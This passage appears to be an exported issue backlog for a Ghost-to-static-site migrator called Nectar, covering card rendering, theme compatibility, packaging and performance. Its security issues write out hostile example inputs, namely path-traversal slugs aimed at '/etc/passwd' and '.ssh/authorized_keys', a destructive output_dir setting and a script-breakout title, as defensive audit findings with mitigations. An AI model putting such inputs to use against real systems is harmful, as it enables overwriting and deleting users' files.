body: Ghost galleries render as `` — typically up to 9 images grouped into rows of 3 with computed aspect ratios driving CSS grid columns. Turndown reduces this to 9 standalone `![alt](src)` lines. The masonry/grid layout, the per-row grouping (which encodes aspect-ratio-aware widths), and the figcaption are all lost. There is no Markdown construct that round-trips back into the gallery card. **Fix**: add a Turndown rule for `figure.kg-gallery-card` that emits a gallery shortcode listing images with their original `width`/`height` attributes (used by Ghost to compute flex-grow per row). Persist the figcaption.

title: ghost-card: gallery: theme-dev — Source CSS styles `.kg-gallery-image` only, not container/row
body:
`screen.css:2308` only styles `.kg-gallery-image` (for hover) — the heavy lifting (`.kg-gallery-container { display: flex; flex-direction: column; gap: … }` and `.kg-gallery-row { display: flex; flex-direction: row; gap: … }`) is **expected to come from a Koenig-injected stylesheet** that Ghost serves separately. Our Source theme does not include this CSS, so even a perfectly migrated gallery renders as a vertical stack of full-width images.

**Fix**: vendor the Koenig gallery CSS into the Source theme, or document that themes must include it. Add a smoke test `tests/render/gallery.test.ts` asserting computed layout (or at least DOM structure).

title: ghost-card: header: rendering — Source styles only h2/h3 inside header card, missing background-image + button
body:
`screen.css:2367-2380` only addresses `.kg-card.kg-header-card h2.kg-header-card-header` and `.kg-header-card h3.kg-header-card-subheader` font choice. There's no rule for the card's full-bleed background image, no rule for `kg-header-card-button`, no rule for `kg-style-dark/light/accent` text inversion. Result: even a perfect import looks like floating text on white.

**Fix**: vendor Koenig's header-card CSS or build minimal styles for `.kg-header-card { background-size: cover; …}`, `.kg-style-dark { color: #fff; }`, `.kg-header-card-button { display: inline-block; …}`.

title: ghost-card: html: migration — raw HTML preserved by Turndown but may include unsafe `<script>`
body:
Ghost HTML card stores arbitrary author-written HTML inside `<!--kg-card-begin: html--> … <!--kg-card-end: html-->`. Turndown's default behavior with `<script>`, `<iframe>`, `<style>` is to drop them; for other tags it tries to convert. Result is unpredictable — sometimes the HTML survives, sometimes it's mangled to markdown.

Also: any `<script>` an author included for trusted embedded widgets vanishes silently, with no warning.

**Fix**: Turndown rule that matches the fence-comment region and converts to a fenced ` ```html` code block OR a `{% raw %}` shortcode that's passed through marked verbatim. Decide on a sanitisation policy in `docs/GHOST_COMPATIBILITY.md` (allow `<iframe>` and trusted-host `<script>`? strip all `<script>`?).

title: ghost-card: html: rendering — marked allows raw HTML but no sanitisation in pipeline
body:
`src/content/markdown.ts` uses `marked` with defaults — raw HTML in the markdown source is passed through to the rendered HTML untouched. This is the right behaviour for trusted authors, but there is no `sanitize-html` / DOMPurify step and no `script-src` CSP guidance. A malicious export or a compromised author can inject XSS.

**Fix**: add an opt-in `markdown.sanitize: 'strict'|'permissive'|'none'` setting. Default to `'permissive'` (strips `<script>` and `on*` handlers, keeps `<iframe>` for embeds with sandbox). Document the trust model.

title: ghost-card: image: image-pipeline — width/height + srcset must be emitted to avoid CLS
body:
Lighthouse penalises images without `width`/`height` attrs (causes layout shift). Ghost always emits both. Our markdown `![alt](src)` doesn't. Even with a figure-promotion pass, we need to **read image dimensions** at build time (via `sharp`/`probe-image-size`/`image-size`) and inject them.

**Fix**: add an asset-pipeline step `src/build/images.ts` that, on first encounter, probes each in-body image, caches `(src → {w, h})`, and injects attrs. For images bundled in the export, this works on disk; for remote images we'd need a fetch-and-cache (off by default).

title: ghost-card: image: migration — caption (figcaption) and alt are preserved but alignment and link wrap are not
body: Ghost image card: ``. Turndown default produces `[![alt](src)](href)` for linked images plus the caption as a stray paragraph — the figure/figcaption pairing is lost, the `kg-width-wide` alignment is lost, the srcset/sizes is lost, the `width`/`height` (which let browsers reserve space) is lost. **Fix**: Turndown rule for `figure.kg-image-card` → emit a shortcode `{% image src="…" alt="…" caption="…" width="…" height="…" align="wide|full|regular" href="…" %}`. Preserve raw `srcset` if present (or re-compute via asset pipeline).

title: ghost-card: image: rendering — `.kg-image` selector exists but no figcaption pipeline
body:
`screen.css:2291` styles `.kg-image` and `:2307` `.kg-image[width][height]` (uses `width`/`height` to compute aspect-ratio). `:2312` styles `.kg-image-card a:hover` (linked-image hover). `:2467` styles `.kg-card.kg-width-full figcaption`. Bare markdown `![alt](src)` produces `` (no `kg-image` class), inside a `

` (no `kg-image-card` wrapper), with no `figcaption`. None of the theme styling applies. Image-heavy posts look unstyled. **Fix**: a remark/marked pass that promotes top-level `

` (single-child paragraphs) to ``. If the markdown caption is the next blockquote or italic line, attach as `

title: ghost-card: paywall: feed/excerpt leak — paid content reaches RSS unless stripped
body:
RSS feeds / Atom feeds typically inline the full post body. If the paywall marker is stripped to nothing, paid content goes out over the wire to every RSS subscriber. We need to apply the paywall cut to the RSS/feed renderer too.

**Fix**: when building feeds, respect the paywall marker. Truncate the body at the marker and append a "Subscribe to read more" stub.

title: ghost-card: toggle: rendering — Source CSS exists but no toggle JS bundled
body:
`screen.css:2170, 2181-2182, 2319-2333` styles `.kg-toggle-card .kg-toggle-content` and `.kg-toggle-heading-text`. The card needs JS to flip `data-kg-toggle-state="close"` ↔ `"open"` on click — Koenig ships this as `kg-toggle.js`. We don't bundle it, so toggles default to whatever the open/close CSS shows (typically: heading visible, body hidden, no way to expand).

**Fix**: vendor `kg-toggle.js` into Source theme `assets/built/`, OR rewrite as `<details>` (native, no JS) and translate CSS. Recommend `<details>` route — simpler.

title: ghost-card: video: image-pipeline — poster image, video file, and captions are all unrelocated
body:
Posters go to `/content/images/`, videos to `/content/media/`, captions to `/content/files/`. Our importer touches none of these directories on disk. Even with a perfect Turndown rule the resulting page references files that don't exist in the static output.

**Fix**: in `importGhostExport`, when the input path is a directory or zip (not just a JSON file), walk `images/`, `media/`, `files/` and copy them into `content/` (or `static/`) preserving the date-based layout.

title: ghost-card: video: migration — transcript, poster, captions track, and aspect ratio all lost
body: Ghost video card: `` plus optional `` and a transcript stored separately. Turndown produces nothing useful — `

title: ghost-card: video: rendering — no `kg-video-*` selectors in Source theme
body:
Like audio, the Source theme has zero `kg-video-*` CSS. The video card is unstyled and the play overlay never appears without Koenig's JS. The `--aspect-ratio` custom property pattern requires `.kg-video-container { aspect-ratio: var(--aspect-ratio); }` which is missing.

**Fix**: vendor `kg-video.css` + `kg-video.js` from `@tryghost/kg-default-cards` (or document hard dependency), and add the `--aspect-ratio` rule.

title: ghost-compat: @config context is exposed as raw NectarConfig — themes expect Ghost's flat shape
body:
In `src/render/engine.ts:131`, `buildRootData` sets `config: engine.config`. Ghost themes access `@config.posts_per_page`, not `@config.build.posts_per_page`. Source's `{{#get "posts" limit=@config.posts_per_page}}` will be `undefined`, leading to the helper falling back to 15 silently.

Fix: build a Ghost-shaped `@config` object: `{ posts_per_page, image_sizes, card_assets }` from the theme package, not the Nectar config.

title: ghost-compat: @site.members_enabled / paid_members_enabled / recommendations_enabled need stable defaults
body: Default to false; document. Source's sidebar branches on these.

title: ghost-compat: RSS feed structure not implemented at all (no `src/build/feeds.ts` file present)
body:
DESIGN.md §3.6 says `feeds.ts` emits sitemap + RSS, but no such file exists in `src/build/`. The config schema has `components.rss.enabled` and `components.sitemap.enabled` but the implementation is missing. Themes shipping `<link rel=alternate type=application/rss+xml>` references will 404.

Fix: implement `src/build/feeds.ts` per design.

title: ghost-compat: Sitemap file structure not implemented at all
body:
Ghost emits five files: `/sitemap.xml` (index), `/sitemap-pages.xml`, `/sitemap-posts.xml`, `/sitemap-tags.xml`, `/sitemap-authors.xml`. The config schema enables sitemap (`components.sitemap.enabled = true`) but no code emits the files (`src/build/feeds.ts` is missing).

Fix: implement multi-file sitemap matching Ghost's structure.

title: ghost-compat: `<!--members-only-->` or visibility:members posts always emit full HTML
body:
Even outside paywall markers, `visibility: members` posts should not emit content to anonymous readers. Currently `Post.visibility = 'members'` is set but never enforced.

Fix: in `planRoutes` or render, when `post.visibility !== 'public'` AND no member exists in build, emit a placeholder body with a portal CTA — never the real content.

title: ghost-compat: assets directory only copied if theme has it — missing in build pipeline
body:
`loadThemeAssets` reads the assets but the build emitter (`src/build/emit.ts`, referenced in design) is not present in the tree. There's no code path that copies assets to `dist/`. Without it, the asset map points at sources that the served site can't reach.

Fix: implement `src/build/emit.ts` per design; copy fingerprinted assets to `dist/assets/`.

title: ghost-compat: build emitter (src/build/emit.ts) doesn't exist — RouteContext.outputPath leads nowhere
body:
Routes are planned but the emitter that actually writes HTML to disk is referenced only in DESIGN.md §3.6 (`emit.ts`) and CLI (`src/cli/commands/build.ts`). I see `planRoutes` but no emit. Builds may use an ad-hoc inline write — verify.

Fix: ensure `src/build/emit.ts` exists and writes each route's HTML to `${output_dir}/${outputPath}`.

title: ghost-compat: content/images directory not emitted under `/content/images/` URL path
body:
Ghost serves uploaded images at `/content/images/2024/01/foo.jpg`. Themes' `feature_image` paths follow this convention. We need to copy `content/images/` to `dist/content/images/`. The config has `content.assets_dir` defaulting to `content/images` but no emit logic exists.

Fix: in build emit, copy `content.assets_dir` → `dist/content/images/`.

title: ghost-compat: routes.yaml not parsed at all
body: Ghost's `routes.yaml` defines custom collections, channels, and routes. Major feature; required for many real themes.

title: ghost-compat: {{#get}} default `limit` is 15, Ghost's default is also 15 — verify behaviour when posts_per_page is requested
body:
Source uses `{{#get "posts" include="authors" limit=@config.posts_per_page}}`. We pull from `engine.config.build.posts_per_page` via `@config`, but we also expose `@config` only as the raw NectarConfig (which has `build.posts_per_page`, not top-level `posts_per_page`). So `@config.posts_per_page` is undefined here, and `parseNum(undefined) ?? 15` yields 15 — silently wrong limit.

Fix: expose a flat `@config.posts_per_page` (Ghost-style) in `buildRootData`.

title: ghost-compat: {{img_url}} does not honour `format="webp"`
body:
Ghost's image API supports `format=webp|avif|jpg|png|gif` (rewrites the URL to e.g. `/content/images/size/w600/format/webp/...`). Source theme actively uses `{{img_url feature_image size="xl" format="webp"}}` in post-card.hbs. We never read `options.hash.format`.

Fix: read `hash.format`, append `/format/<value>/` to the URL.

title: ghost-compat: {{img_url}} does not look up image_sizes from the theme — it just checks key existence
body:
`src/render/helpers/assets.ts:33` does `if (size && engine.theme.pkg.image_sizes[size])` but the body of that branch (`cleaned = candidate.replace(/^\//, ''); url = '/' + cleaned`) doesn't actually USE the size to alter the URL. It only normalises a leading slash. The size attribute is effectively a no-op.

Fix: use the width from `image_sizes[size].width` to construct the Ghost-style `/content/images/size/w{width}/...` path.

title: ghost-compat: {{img_url}} does not output Ghost's image-resize URLs (/content/images/size/wXXX/...)
body:
Ghost serves resized images at `/content/images/size/w600/2024/01/foo.jpg`. Our `img_url` in `src/render/helpers/assets.ts` ignores `size` entirely (writes the same URL irrespective), so a theme producing a `srcset="… size=\"xs\" … size=\"xxl\""` set will emit identical URLs at every width — `srcset` is useless and bandwidth multiplies.

Fix: at minimum, rewrite the URL to inject `/size/wXXX/` based on `theme.pkg.image_sizes`. Optional component to actually resize via sharp.

title: ghost-import: no slug sanitisation against path traversal
body: import.ts writes to `content/posts/<slug>.md`. If a malicious export contains `slug: "../../etc/passwd"`, we'd traverse. Validate slug matches `/^[a-z0-9-]+$/`.

title: image-pipeline: `img_url size=` is a no-op
body: `src/render/helpers/assets.ts` `imgUrlHelper` accepts `size=` and looks up `theme.pkg.image_sizes[size]`, but never actually rewrites the URL or generates a resized image — it just returns the original path. Themes (Source, Casper) rely on `size=` for responsive `srcset` and will load full-resolution images everywhere. Wire up Sharp/Squoosh-WASM to materialise sized variants under `dist/_images/<hash>/<size>.<ext>`.

title: image-pipeline: no resizing of feature_image to image_sizes
body: Use sharp (optional) to produce per-size variants. Cache by content hash.

title: infra: no .github/workflows for CI
body: Add a workflow running typecheck + bun test + biome check on PRs to main.

title: members: context: `@site.members_enabled` should be derivable from `[components.portal].provider != "none"`
body:
Currently `@site.members_enabled` is not even set on SiteData (`src/content/model.ts:3-18`). Source theme branches on it 5× in `header.hbs`, `footer.hbs`, `cta.hbs`, `navigation.hbs`, `post-list.hbs`. Default is `undefined` → falsy → no signup UI ever renders.

Fix: derive from config: when `[components.portal]` is present with `provider != "none"`, set `site.members_enabled = true`. Add `members_enabled`, `paid_members_enabled`, `recommendations_enabled`, `members_invite_only` to SiteData with explicit defaults.

title: members: end-to-end docs page — `docs/MEMBERS.md` does not exist
body:
Create a dedicated guide (linked from README and GHOST_COMPATIBILITY.md) walking through:
1. The migration path from Ghost members → Buttondown / Beehiiv / Substack
2. What `@member`, `@site.members_enabled`, `{{#unless access}}` mean in Nectar
3. How the portal adapter rewrites buttons and forms
4. Examples for each supported provider
5. Known parity gaps (no per-user state, no tier checks, no signin / account / upgrade in the static page itself)

P0 because new users have no orientation without it.

title: members: no docs explaining members are out of scope
body: Users migrating from a Ghost site with paying members must know what they lose.

title: members: no stub for @member context
body: Source theme reads `@member` extensively. Currently undefined; many template branches misbehave. Provide `@member = undefined` consistently and document.

title: members: portal: `<button data-portal="signup">` renders but does nothing without runtime
body:
Source theme's `navigation.hbs:38-46` and `post-list.hbs:101-115` emit `data-portal` buttons unconditionally when `@site.members_enabled` is truthy. With no Portal JS shipped, the buttons are silent no-ops — terrible first-run UX.

Fix: ship `dist/assets/nectar-portal.js` automatically (only when `@site.members_enabled = true` is configured) that:
  1. Locates every `[data-portal]` element
  2. For `signup` / `subscribe` opens the configured provider (Buttondown/Beehiiv embed or popup window)
  3. For `signin` / `account` either redirects to provider URL or no-ops with a console.warn
  4. For `upgrade` and `recommendations` shows a documented stub

Load via `{{ghost_foot}}` injection (analogous to how Ghost injects portal.min.js) so users don't have to touch the theme.

title: members: portal: no `[components.portal]` provider abstraction in nectar.toml
body:
Ghost's Portal (`portal.min.js`) is loaded automatically by themes via `data-portal="signup|signin|account|upgrade|recommendations"` triggers. Nectar has no server and no built-in portal. Themes that ship the example/Source theme reference `data-portal` 6× in `navigation.hbs` and `post-list.hbs` — those buttons are dead in a Nectar build.

**What Ghost provides**: a single JS bundle that injects an iframe modal handling signup, signin (magic link), account page, paid upgrades, and recommendations.

**What themes expect**: clicking `<button data-portal="signup">` opens a signup modal; the form posts to `/members/api/...` Ghost endpoints.

**What Nectar should provide**: a config-driven adapter so themes keep working unchanged.
```toml
[components.portal]
provider = "buttondown" # or beehiiv | substack | convertkit | bentonow | mailerlite | custom
publication = "my-newsletter"
signin_url = "https://buttondown.email/login"
account_url = "https://buttondown.email/account"
```
Impl plan: register a build-time post-render transform that scans for `data-portal="…"` and rewrites `href`/`onclick` to the provider's URLs. Provide a tiny `nectar-portal.js` shim that intercepts clicks and opens the provider in a popup. Document the gap (no `@member`, no per-user state) — the shim is one-way (signup only).

title: members: tiers: no `{{#get "tiers"}}` data store
body:
Ghost exposes free / paid / comp tiers via `{{#get "tiers"}}` and `{{tiers}}`. Themes use them to render pricing tables. Nectar has zero tier concept. Decide policy:
- Option A: out of scope; document and make the helper return `[]` so iteration is no-op.
- Option B: declarative tiers in `nectar.toml`:
  ```toml
  [[tiers]]
  name = "Free"
  monthly_price = 0
  description = "Weekly newsletter"
  
  [[tiers]]
  name = "Premium"
  monthly_price = 9
  yearly_price = 90
  description = "Plus archives + Discord"
  signup_url = "https://buttondown.email/pay/premium"
  ```
  Then `{{#get "tiers"}}` resolves from this static list, `{{price}}` formats it, and Subscribe buttons route to per-tier signup URLs.

Recommendation: B, ranked P0 because tier-driven pricing pages are a top-3 reason migrators stay with Ghost.

title: migration: import-ghost cannot read multi-DB Ghost exports
body: `src/ghost/import.ts` reads `db[0].data` only. Newer Ghost admin exports (with split tables for posts_meta, members, snippets) span multiple `db[i]` blocks. Merge across all DB entries before processing. Without this, a real Ghost export silently drops content.

title: migration: no Lexical/Mobiledoc body conversion
body: Posts in current Ghost installs are stored as Lexical or Mobiledoc. Our importer logs a warning and writes an empty body for those — that's all of Ghost ≥ 5.x. Vendor or wrap `@tryghost/kg-default-cards` + `@tryghost/kg-lexical-html-renderer` to materialise HTML, then turndown to Markdown. This is *the* migration blocker.

title: migration: no image download from Ghost CDN
body: Ghost exports reference `https://images.unsplash.com/...` and `https://my-ghost-site.com/content/images/2024/01/foo.jpg`. Today we write the URL verbatim into frontmatter and the user's static site keeps hotlinking the original Ghost CDN. Implement an `--download-images` flag that walks every image URL, fetches to `content/images/`, and rewrites references.

title: newsletter: email-only card markup (signup, email-cta, paywall) not handled in content pipeline
body:
Ghost's editor outputs `<div class="kg-card kg-signup-card">`, `<div class="kg-card kg-email-cta-card">`, `<div class="kg-card kg-paywall-card">` cards in post HTML. On the web, Ghost renders these as interactive components (signup card opens portal; paywall hides content below). For Nectar:
- `kg-signup-card`: replace with `partials/email-subscription.hbs` (or strip if portal disabled)
- `kg-email-cta-card`: strip entirely (it's email-only)
- `kg-paywall-card`: strip content below this card when visibility != public; keep when public
- `kg-button-card`: keep as-is (already plain link)

Implement as HTML post-processor in the content pipeline (`src/content/markdown.ts` adjacent).

title: packaging: bin entry points at .ts source, breaks any non-Bun install
body: `"bin": { "nectar": "src/cli/index.ts" }` works under Bun's runtime but breaks for users without Bun installed globally, and for sandboxed CI installs. Either compile to a JS shim (`dist/cli/index.js` with shebang) on prepublish, or emit a single-file binary (see other issue). Without this, `bunx nectar` only works if user already has bun.

title: packaging: no CHANGELOG.md and no release-notes pipeline
body: No `CHANGELOG.md`, no Conventional-Commit enforcement, no release-please/changeset config. Pick one: (a) `release-please` workflow keyed off `conventional-commits`, or (b) `changesets` with PR-attached notes. Without either, users have no upgrade signal beyond git log.

title: packaging: no `files` field — publish will ship src, tests, example, dist by accident
body: Without an explicit `files` whitelist in package.json, npm publishes everything not in `.npmignore`. Add `"files": ["dist", "bin", "README.md", "LICENSE", "CHANGELOG.md"]` (after introducing a compiled `dist/`). Otherwise our published tarball will balloon with `example/`, `tests/`, and `.claude/`.

title: packaging: no automated GitHub Release on tag
body: Tagging today does nothing. Add `.github/workflows/release.yml` that on `v*` tag: runs full test+typecheck+lint, builds binaries per triple, generates checksums, creates a GitHub Release with notes from CHANGELOG, attaches binaries+SHASUMS, then publishes to npm with provenance.

title: packaging: no prepublish build step / no compiled output
body: We ship .ts and rely on Bun runtime resolving `.ts` extensions and `~/...` path aliases. Both are non-portable. Add a `prepublishOnly` script that runs `bun build` to ESM JS + types declarations, and update `bin` and `exports` to point at the compiled output.

title: packaging: no single-file binary build (Bun supports `bun build --compile`)
body: Bun can emit a fully self-contained executable so users do not need Bun on their machine. For a migrator coming from Ghost, downloading `nectar-darwin-arm64` is a much friendlier first taste than `curl bun.sh | bash; bun i -g nectar`. Add a release job that runs `bun build --compile --target=bun-{darwin,linux,windows}-{x64,arm64} src/cli/index.ts --outfile nectar-<triple>` for each triple and uploads to the GitHub Release.

title: packaging: package.json is private and unpublishable to npm
body: `package.json` has `"private": true` and `"version": "0.0.1"`, so `npm publish` is blocked. A Ghost migrator who reads our README cannot `npm i -g nectar` or `bunx nectar`. Required for shipping: flip `private` off, add `repository`, `homepage`, `bugs`, `keywords`, `author`, `files` whitelist, and a non-0 published version (e.g. 0.1.0 for first public). Decide on a npm org/scope (`@nectar/cli` vs root `nectar`).

title: perf: build: no incremental builds — full rebuild every invocation
body:
build() removes the entire output dir (`rm(outputDir, { recursive: true, force: true })`) on every run and re-renders every route from scratch. For a 10k-post site with one edit, this is 100% wasted work — and aggressive on SSD write cycles.

Fix: detect changed inputs (post file mtimes vs a manifest of last-build mtimes) and only rerender affected routes. Tag/author/index pages must be recomputed when any post in their set changes; everything else can be skipped. Companion: keep a `.nectar-cache/manifest.json`. Provides 50-1000x speedup on watch/dev workflows.

title: perf: emit/copyContentAssets: no size cap on large feature_image (40MB raw photos)
body:
If a user drops a 40MB DSLR JPEG into content/images, the build copies it verbatim into dist/. The browser will then download 40MB for the LCP image — Web Vitals collapse, mobile users on cellular get charged real money.

Fix: during copyContentAssets, refuse to emit images over a configurable max (default 5MB), or auto-resize to a sane max dimension (e.g. 2400px) using sharp. Log a warning per oversize file with the fix command. Optional: emit WebP/AVIF variants automatically.

title: perf: ghost-import: O(N×M) tagSlugsForPost and authorSlugsForPost
body:
src/ghost/import.ts tagSlugsForPost / authorSlugsForPost (lines 107-119) filter the entire posts_tags / posts_authors array per post. For a 50k-post Ghost export with 200k posts_tags rows: 50k × 200k = 10^10 ops. Imports take hours.

Fix: build `Map<post_id, tag_ids[]>` and `Map<post_id, user_ids[]>` once outside the loop. O(N+M).

title: perf: helpers/assets: img_url with size silently returns unsized URL
body:
assets.ts img_url helper (lines 24-45) accepts a `size` param but does NOT resize images — it just returns the original URL prefixed with `/`. The example HTML shows /content/images/welcome-cover.svg 2000w even though no 2000w variant exists. Browsers will download the full-resolution image regardless of which srcset candidate is picked → LCP regression on hero images.

Fix: implement build-time image resizing (sharp / Bun's Image API when available). For each `image_sizes` entry in theme package.json, emit a resized variant during copyContentAssets, and rewrite img_url to point to it. Critical for Web Vitals.

title: perf: helpers/blocks: `get` helper applies sort on every invocation
body:
src/render/helpers/blocks.ts get helper (lines 117-150) does `applyOrder(results, order)` — a full sort — every time `{{#get "posts" ...}}` is invoked in any template. Themes typically call `{{#get "posts" limit=5 order="published_at desc"}}` on every page. 10k pages × O(N log N) sort over 10k posts = catastrophe.

Fix: memoize sorted lists by `${resource}|${order}` on the engine. posts is already sorted by published_at desc in loader.ts — short-circuit when order matches the default.

title: perf: helpers/blocks: `get` helper filters with O(N) scan per call
body:
Same helper: applyFilter does a linear scan over all posts per Handlebars call. A theme's related-posts block calls this per article render → for 10k posts that's 10k × 10k = 10^8 ops/build.

Fix: build secondary indexes (by tag, by author, by featured) at engine boot. Route the filter parser to use indexes for the supported keys (`tag`, `tags`, `author`, `authors`, `featured`, `id`, `slug`). Fall back to linear scan only for unindexed keys.

title: perf: loader: O(tags × posts) tag.count.posts recomputation
body:
src/content/loader.ts lines 54-56 loops over every tag and re-filters every post: `tag.count.posts = resolvedPosts.filter(...).length`. Same O(T·P) trap as routes.ts. With 100k tags and 10k posts: ~10^9 ops just to compute a counter.

Fix: single pass — iterate posts once and bump `tagMap.get(t.slug).count.posts++` per tag reference. O(P · t_per_post).

title: perf: loader: serial markdown rendering — no parallelism
body:
renderMarkdown is awaited per post inside the serial readFile loop in loader.ts:163. marked.parse is CPU-bound (~2-5ms per typical post). 10k posts × 3ms = 30s on the main thread.

Fix: option A — batch and Promise.all the markdown parsing once files are in memory (marked is sync but `parse` returns a Promise that resolves on next tick, so chunked Promise.all still helps). Option B — offload to worker_threads (Bun's Worker), shard posts across `navigator.hardwareConcurrency` workers. Expected 4-8x on multi-core.

title: perf: loader: serial readFile in loadMarkdownDir
body:
src/content/loader.ts loadMarkdownDir (lines 153-166) uses `for await (const rel of glob.scan())` and then `await readFile(file)` + `await normalize(...)` inside the loop — strictly serial. For 10k posts at ~1ms/file this is ~10s of pure I/O wait that could be ~0.5s on an SSD.

Fix: collect file paths first, then `Promise.all(files.map(async f => normalize(f, await readFile(f))))`. To avoid running out of fds on 100k+ files, wrap with a concurrency limiter (e.g. 64-256 parallel reads). Even simpler: use Bun.file(path).text() which streams.

title: perf: no worker_threads / parallelism for CPU-bound markdown + handlebars
body:
The entire build runs in a single thread. Markdown parse and Handlebars compile/execute are CPU-bound. On a modern 8-16 core dev box this leaves 80-95% of CPU idle.

Fix: shard renders across `os.availableParallelism()` Bun Workers. Each worker imports loader output (serialized) + theme, then renders its slice of routes. Combine HTML strings via SharedArrayBuffer or postMessage. Expected 4-8x on cold builds for content-heavy sites.

title: perf: output: LCP image not preloaded with fetchpriority
body: Hero image on post pages (feature_image.hbs) is a normal tag with no `fetchpriority=high` and no ``. Browsers discover it only after parsing past the preload-scanner stylesheet step. LCP delay typically 200-800ms. Fix: in default.hbs , when route.kind === 'post' and post.feature_image exists, emit `` plus `` on the feature-image partial when it is the LCP candidate.

title: perf: output: images missing width/height — CLS risk
body: post-card.hbs and feature-image.hbs `` tags do not set `width`/`height` attributes. Without intrinsic dimensions the browser cannot reserve space, causing layout shift when the image loads. CLS budget is <0.1; a single un-sized hero typically scores 0.15-0.3. Fix: store intrinsic image dimensions during copyContentAssets (use sharp/image-size to read PNG/JPEG/WebP headers — cheap, no full decode), expose as `feature_image_width`/`feature_image_height` on Post, and render them in the img tag.

title: perf: pipeline: sequential for-of render loop blocks event loop
body:
src/build/pipeline.ts renders routes in a serial `for (const route of routes)` loop. Even though render itself is sync, the awaited writeHtml after every render serializes disk I/O. With 10k posts and ~5ms/render + ~2ms/write that is ~70s wall time when it could be ~25s.

Fix: split into two phases — (1) render all to in-memory strings (CPU-bound, can use worker_threads pool sharded by route), (2) write with `Promise.all` in batches of 256-1024 (or use a p-limit-style semaphore). Bun supports Workers; alternatively just batch writes with `Promise.all(chunks.map(writeHtml))` for an easy 3-5x win without workers.

title: perf: render: re-compile inner+layout templates per route
body:
src/render/engine.ts renderRoute() calls hb.compile(body), hb.compile(layoutSource) on every single route. Templates are compiled once during createEngine() into the templates map but those compiled functions are then ignored and recompiled per render. For a 10k post site this is 10k * 2 wasted compiles (≈100MB+ ephemeral strings + AST garbage), and Handlebars.compile is the single most expensive call in the hot path.

Measurement: instrument createEngine.render with `performance.now()` deltas; sample heap with `process.memoryUsage().heapUsed` before/after planRoutes.forEach.

Fix: cache compiled inner and layout delegates on the engine — pre-compile `engine.templates[name]` and `engine.layouts[name]` once at startup (the engine already populates `templates`, just use them), index by template name + layout name, and in renderRoute look them up instead of recompiling. Expected 5-15x speedup on the render phase for medium sites.

title: perf: routes: O(tags × posts) tag/author route planning
body:
src/build/routes.ts builds tag pages with `content.posts.filter((p) => p.tags.some((t) => t.slug === tag.slug))` for every tag (line 62) and the same pattern for authors (line 87). That is O(T × P × T_per_post). For 100k tags × 10k posts × avg 3 tags/post ≈ 3 × 10^9 ops — minutes of wall time.

Fix: build a `Map<tagSlug, Post[]>` and `Map<authorSlug, Post[]>` in loader.ts during the single sweep over posts, then `planRoutes` does an O(1) lookup. Also pre-sort once. Expected drop from O(T·P) to O(P + T).

title: perf: scale: 100k tags blows up routes.ts
body:
planRoutes builds a route per tag × per pagination page. 100k tags × avg 1.2 pages = ~120k tag routes alone. Combined with the O(T·P) filter bug (separate issue), planning phase becomes O(10^9) on input alone.

Fix: (1) fix the filter via indexed map (separate issue). (2) gate tag/author route generation behind a `min_posts_per_tag` config (e.g. default 1) — sites importing from Ghost often have hundreds of hash- tags with 0 posts. (3) consider on-demand 404 with a search index instead of pre-rendering ultra-long-tail tag pages.

title: perf: scale: 10k posts estimated build time
body:
Back-of-envelope on current sequential code: 10k × (1ms readFile + 3ms markdown + 5ms render + 2ms write) = 110s wall + asset stage. Memory peak ~600MB (full html in graph). With the fixes proposed (parallelism, template caching, indexes, incremental, image cap) target is <15s cold, <1s incremental, <300MB peak.

Fix: ship benchmarks/bench-10k.ts that generates 10k synthetic posts and measures end-to-end. Track via CI to prevent regressions.

title: recommendations: `{{recommendations}}` helper not implemented
body:
Source theme's `post-list.hbs:114` calls `{{recommendations}}`. We register no such helper — Handlebars throws `Missing helper: recommendations`. Already filed as P0 in self-audit but no concrete shape:

**Impl plan**:
1. Register `recommendations` helper that reads from `engine.content.recommendations`.
2. Add `[[recommendations]]` array to nectar.toml: `{ title, url, description, favicon, reason }` each.
3. Render via a built-in partial `nectar/recommendation-card.hbs` (or pass to theme via inverse block).
4. Honour `limit=` hash option (default 5).

Example:
```toml
[[recommendations]]
title = "Stratechery"
url = "https://stratechery.com"
description = "Ben Thompson on tech and strategy"
favicon = "/images/stratechery.png"
```

title: render: `ghost_head` JSON-LD does not encode special characters before JSON.stringify
body: If a post title contains `</script>`, JSON.stringify won't escape `<`. Embed the JSON-LD with `</` escaped to `<\/` to prevent script-out injection.

title: render: ctx.post is also set for page routes, breaking {{#post}}/{{#page}} disambiguation
body:
src/render/engine.ts:buildContext sets `ctx.post = data.page` when rendering a page. Ghost themes use `{{#post}}` and `{{#page}}` as mutually exclusive context blocks. Setting both means a theme that branches on `{{#post}}` would incorrectly enter that branch on a static page.

**Fix**: set only the relevant context, not both.

title: render: missing helper — `access`
body: Themes use `{{#unless access}}` to gate content for non-members. Without it, the lock icon path in post-card.hbs may crash.

title: render: missing helper — `recommendations`
body: Source theme uses `{{recommendations}}` in the sidebar. Currently unimplemented — Handlebars emits a 'missing helper' warning or crash depending on version. Stub.

title: render: {{img_url size=}} returns the same URL for every srcset entry
body: helpers/assets.ts:imgUrlHelper recognises `size=` but doesn't actually pick a resized variant. The result is a `srcset` that lists the same source URL six times — wastes bandwidth on each fetch and disables responsive selection. Implement actual image resizing (separate issue) and emit unique URLs per size.

title: security: Ghost import trusts `post.slug` and writes to arbitrary paths via `${slug}.md`
body: src/ghost/import.ts:126 falls back to `slugify(post.title)` only when `post.slug` is empty. If the export contains `"slug": "../../.ssh/authorized_keys"`, the destination is `join(cwd, 'content/posts', '../../.ssh/authorized_keys.md')`, which `path.join` resolves outside the content directory. `writeFile` then clobbers files outside the project. Same issue for `tag.slug` (line 165) and `user.slug` (line 181). Threat model: user runs `nectar import-ghost some-export.json` on an export sourced from an untrusted backup, hosted file, or compromised Ghost instance. Mitigation: re-slugify every slug from the export, and assert the resolved path is under `join(cwd, 'content/posts')` etc.

title: security: `rm -rf outputDir` runs without confirmation; misconfigured `output_dir` deletes user files
body: src/build/pipeline.ts:25-26 computes `outputDir = join(cwd, config.build.output_dir)` and immediately `rm(outputDir, { recursive: true, force: true })`. There is no check that `output_dir` is inside cwd (a user setting `output_dir = "../.."` in nectar.toml wipes their parent directory), no check that it differs from `cwd` itself (`output_dir = "."` deletes the project), no protection against absolute paths (`/`), and no preserve-list. Threat: a malicious PR that tweaks `nectar.toml` to `output_dir = "/Users/runner"` weaponises a CI build into data destruction. Mitigation: refuse absolute paths, refuse paths that resolve outside cwd, refuse `.` / empty, and clear the dist directory by deleting children rather than the directory itself.

title: security: codeinjection_head / codeinjection_foot from any Markdown frontmatter inject raw HTML
